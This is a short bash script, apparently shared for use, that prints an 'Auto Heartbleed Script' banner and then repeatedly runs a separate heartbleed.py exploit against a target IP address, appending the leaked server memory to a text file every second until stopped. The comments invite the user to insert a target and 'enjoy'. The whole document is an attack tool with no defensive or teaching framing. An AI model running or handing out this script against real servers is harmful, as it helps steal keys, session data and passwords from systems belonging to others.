#!/bin/bash
# Instead of 0.0.0.0 put in the IP adress of your target
# This simple script basically runs the heartbleed exploit over, and over again
# and saves the memory leak to a textfile, enjoy.
cat << EOF
   _____                              .__                         
  /  _  \   _____   _________________ |  |__   ____  __ __  ______
 /  /_\  \ /     \ /  _ \_  __ \____ \|  |  \ /  _ \|  |  \/  ___/
/    |    \  Y Y  (  <_> )  | \/  |_> >   Y  (  <_> )  |  /\___ \ 
\____|__  /__|_|  /\____/|__|  |   __/|___|  /\____/|____//____  >
        \/      \/             |__|        \/                  \/ 
Auto Heartbleed Script By Amorphous

EXPLOIT RUNNING… Saving Data To "Heartbleed.txt"
Press Control+C To Stop.
EOF
while true;
do
python heartbleed.py 0.0.0.0 >> heartbleed.txt
sleep 1; 
done
